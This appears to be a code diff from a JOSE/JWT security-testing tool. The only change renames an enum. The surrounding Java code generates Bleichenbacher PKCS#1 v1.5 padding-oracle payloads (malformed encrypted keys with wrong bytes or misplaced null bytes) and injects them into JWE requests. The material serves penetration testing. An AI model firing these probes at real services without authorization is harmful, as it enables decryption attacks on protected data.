@@ -79,7 +79,7 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
     private int amountRequests = 0;
 
     // Types of payload variation
-    private enum payloadType {
+    private enum PayloadType {
         ORIGINAL,
         NO_NULL_BYTE,
         NULL_BYTE_IN_PADDING,
@@ -93,18 +93,18 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
         WRONG_SECOND_BYTE
     }
 
-    // Hashmap of available payloads with a verbose name (including the payloadType)
-    private static final HashMap<String, payloadType> payloads = new HashMap<String, payloadType>() {{
-        put(String.format("No Null Byte (0x%02X)", payloadType.NO_NULL_BYTE.ordinal()), payloadType.NO_NULL_BYTE);
-        put(String.format("Null Byte in Padding (0x%02X)", payloadType.NULL_BYTE_IN_PADDING.ordinal()), payloadType.NULL_BYTE_IN_PADDING);
-        put(String.format("Null Byte in PKCS Padding (0x%02X)", payloadType.NULL_BYTE_IN_PKCS_PADDING.ordinal()), payloadType.NULL_BYTE_IN_PKCS_PADDING);
-        put(String.format("Symmetric Key of Size 8 (0x%02X)", payloadType.SYMMETRIC_KEY_OF_SIZE_8.ordinal()), payloadType.SYMMETRIC_KEY_OF_SIZE_8);
-        put(String.format("Symmetric Key of Size 16 (0x%02X)", payloadType.SYMMETRIC_KEY_OF_SIZE_16.ordinal()), payloadType.SYMMETRIC_KEY_OF_SIZE_16);
-        put(String.format("Symmetric Key of Size 24 (0x%02X)", payloadType.SYMMETRIC_KEY_OF_SIZE_24.ordinal()), payloadType.SYMMETRIC_KEY_OF_SIZE_24);
-        put(String.format("Symmetric Key of Size 32 (0x%02X)", payloadType.SYMMETRIC_KEY_OF_SIZE_32.ordinal()), payloadType.SYMMETRIC_KEY_OF_SIZE_32);
-        put(String.format("Symmetric Key of Size 40 (0x%02X)", payloadType.SYMMETRIC_KEY_OF_SIZE_40.ordinal()), payloadType.SYMMETRIC_KEY_OF_SIZE_40);
-        put(String.format("Wrong First Byte (0x%02X)", payloadType.WRONG_FIRST_BYTE.ordinal()), payloadType.WRONG_FIRST_BYTE);
-        put(String.format("Wrong Second Byte (0x%02X)", payloadType.WRONG_SECOND_BYTE.ordinal()), payloadType.WRONG_SECOND_BYTE);
+    // Hashmap of available payloads with a verbose name (including the PayloadType)
+    private static final HashMap<String, PayloadType> payloads = new HashMap<String, PayloadType>() {{
+        put(String.format("No Null Byte (0x%02X)", PayloadType.NO_NULL_BYTE.ordinal()), PayloadType.NO_NULL_BYTE);
+        put(String.format("Null Byte in Padding (0x%02X)", PayloadType.NULL_BYTE_IN_PADDING.ordinal()), PayloadType.NULL_BYTE_IN_PADDING);
+        put(String.format("Null Byte in PKCS Padding (0x%02X)", PayloadType.NULL_BYTE_IN_PKCS_PADDING.ordinal()), PayloadType.NULL_BYTE_IN_PKCS_PADDING);
+        put(String.format("Symmetric Key of Size 8 (0x%02X)", PayloadType.SYMMETRIC_KEY_OF_SIZE_8.ordinal()), PayloadType.SYMMETRIC_KEY_OF_SIZE_8);
+        put(String.format("Symmetric Key of Size 16 (0x%02X)", PayloadType.SYMMETRIC_KEY_OF_SIZE_16.ordinal()), PayloadType.SYMMETRIC_KEY_OF_SIZE_16);
+        put(String.format("Symmetric Key of Size 24 (0x%02X)", PayloadType.SYMMETRIC_KEY_OF_SIZE_24.ordinal()), PayloadType.SYMMETRIC_KEY_OF_SIZE_24);
+        put(String.format("Symmetric Key of Size 32 (0x%02X)", PayloadType.SYMMETRIC_KEY_OF_SIZE_32.ordinal()), PayloadType.SYMMETRIC_KEY_OF_SIZE_32);
+        put(String.format("Symmetric Key of Size 40 (0x%02X)", PayloadType.SYMMETRIC_KEY_OF_SIZE_40.ordinal()), PayloadType.SYMMETRIC_KEY_OF_SIZE_40);
+        put(String.format("Wrong First Byte (0x%02X)", PayloadType.WRONG_FIRST_BYTE.ordinal()), PayloadType.WRONG_FIRST_BYTE);
+        put(String.format("Wrong Second Byte (0x%02X)", PayloadType.WRONG_SECOND_BYTE.ordinal()), PayloadType.WRONG_SECOND_BYTE);
     }};
 
     // List of prepared requests with payload info
@@ -158,7 +158,7 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
                 }
         }
 
-        HashMap<payloadType, byte[]> encryptedKeys;
+        HashMap<PayloadType, byte[]> encryptedKeys;
 
         try {
             encryptedKeys = generatePkcs1Vectors(pubKey, 32);
@@ -168,7 +168,7 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
         }
 
         // Prepare requests
-        for (Map.Entry<payloadType, byte[]> cek : encryptedKeys.entrySet()) {
+        for (Map.Entry<PayloadType, byte[]> cek : encryptedKeys.entrySet()) {
             byte[] request = this.requestResponse.getRequest();
             String[] components = Decoder.getComponents(this.parameter.getJoseValue());
             components[1] = Decoder.base64UrlEncode(cek.getValue());
@@ -247,7 +247,7 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
     }
 
     @Override
-    public HashMap<String, payloadType> getPayloadList() {
+    public HashMap<String, PayloadType> getPayloadList() {
         return payloads;
     }
 
@@ -280,7 +280,7 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
      * @param keySize Key size
      * @return Hashmap of encrypted padded keys and according payload type
      */
-    private HashMap<payloadType, byte[]> generatePkcs1Vectors(RSAPublicKey publicKey, int keySize) {
+    private HashMap<PayloadType, byte[]> generatePkcs1Vectors(RSAPublicKey publicKey, int keySize) {
         // Generate random key
         Random random = new Random();
         byte[] keyBytes = new byte[keySize];
@@ -288,7 +288,7 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
 
         int rsaKeyLength = publicKey.getModulus().bitLength() / 8;
 
-        HashMap<payloadType, byte[]> encryptedKeys = new HashMap<>();
+        HashMap<PayloadType, byte[]> encryptedKeys = new HashMap<>();
 
         try {
             Security.addProvider(new BouncyCastleProvider());
@@ -296,17 +296,17 @@ public class BleichenbacherPkcs1Info implements IAttackInfo {
             rsa.init(Cipher.ENCRYPT_MODE, publicKey);
 
             // create plain padded key and encrypt them
-            encryptedKeys.put(payloadType.NO_NULL_BYTE, rsa.doFinal(getEK_NoNullByte(rsaKeyLength, keyBytes)));
-            encryptedKeys.put(payloadType.NULL_BYTE_IN_PADDING, rsa.doFinal(getEK_NullByteInPadding(rsaKeyLength, keyBytes)));
-            encryptedKeys.put(payloadType.NULL_BYTE_IN_PKCS_PADDING, rsa.doFinal(getEK_NullByteInPkcsPadding(rsaKeyLength, keyBytes)));
-            encryptedKeys.put(payloadType.SYMMETRIC_KEY_OF_SIZE_16, rsa.doFinal(getEK_SymmetricKeyOfSize16(rsaKeyLength, keyBytes)));
-            encryptedKeys.put(payloadType.SYMMETRIC_KEY_OF_SIZE_24, rsa.doFinal(getEK_SymmetricKeyOfSize24(rsaKeyLength, keyBytes)));
-            encryptedKeys.put(payloadType.SYMMETRIC_KEY_OF_SIZE_32, rsa.doFinal(getEK_SymmetricKeyOfSize32(rsaKeyLength, keyBytes)));
-            encryptedKeys.put(payloadType.SYMMETRIC_KEY_OF_SIZE_40, rsa.doFinal(getEK_SymmetricKeyOfSize40(rsaKeyLength, keyBytes)));
-            encryptedKeys.put(payloadType.SYMMETRIC_KEY_OF_SIZE_8, rsa.doFinal(getEK_SymmetricKeyOfSize8(rsaKeyLength, keyBytes)));
-            encryptedKeys.put(payloadType.WRONG_FIRST_BYTE, rsa.doFinal(getEK_WrongFirstByte(rsaKeyLength, keyBytes)));
-            encryptedKeys.put(payloadType.WRONG_SECOND_BYTE, rsa.doFinal(getEK_WrongSecondByte(rsaKeyLength, keyBytes)));
-            encryptedKeys.put(payloadType.ORIGINAL, rsa.doFinal(getPaddedKey(rsaKeyLength, keyBytes)));
+            encryptedKeys.put(PayloadType.NO_NULL_BYTE, rsa.doFinal(getEK_NoNullByte(rsaKeyLength, keyBytes)));
+            encryptedKeys.put(PayloadType.NULL_BYTE_IN_PADDING, rsa.doFinal(getEK_NullByteInPadding(rsaKeyLength, keyBytes)));
+            encryptedKeys.put(PayloadType.NULL_BYTE_IN_PKCS_PADDING, rsa.doFinal(getEK_NullByteInPkcsPadding(rsaKeyLength, keyBytes)));
+            encryptedKeys.put(PayloadType.SYMMETRIC_KEY_OF_SIZE_16, rsa.doFinal(getEK_SymmetricKeyOfSize16(rsaKeyLength, keyBytes)));
+            encryptedKeys.put(PayloadType.SYMMETRIC_KEY_OF_SIZE_24, rsa.doFinal(getEK_SymmetricKeyOfSize24(rsaKeyLength, keyBytes)));
+            encryptedKeys.put(PayloadType.SYMMETRIC_KEY_OF_SIZE_32, rsa.doFinal(getEK_SymmetricKeyOfSize32(rsaKeyLength, keyBytes)));
+            encryptedKeys.put(PayloadType.SYMMETRIC_KEY_OF_SIZE_40, rsa.doFinal(getEK_SymmetricKeyOfSize40(rsaKeyLength, keyBytes)));
+            encryptedKeys.put(PayloadType.SYMMETRIC_KEY_OF_SIZE_8, rsa.doFinal(getEK_SymmetricKeyOfSize8(rsaKeyLength, keyBytes)));
+            encryptedKeys.put(PayloadType.WRONG_FIRST_BYTE, rsa.doFinal(getEK_WrongFirstByte(rsaKeyLength, keyBytes)));
+            encryptedKeys.put(PayloadType.WRONG_SECOND_BYTE, rsa.doFinal(getEK_WrongSecondByte(rsaKeyLength, keyBytes)));
+            encryptedKeys.put(PayloadType.ORIGINAL, rsa.doFinal(getPaddedKey(rsaKeyLength, keyBytes)));
 
         } catch (BadPaddingException | IllegalBlockSizeException | InvalidKeyException | NoSuchAlgorithmException | NoSuchPaddingException e) {
             loggerInstance.log(getClass(), "Error during key encryption: " + e.getMessage(), Logger.LogLevel.ERROR);
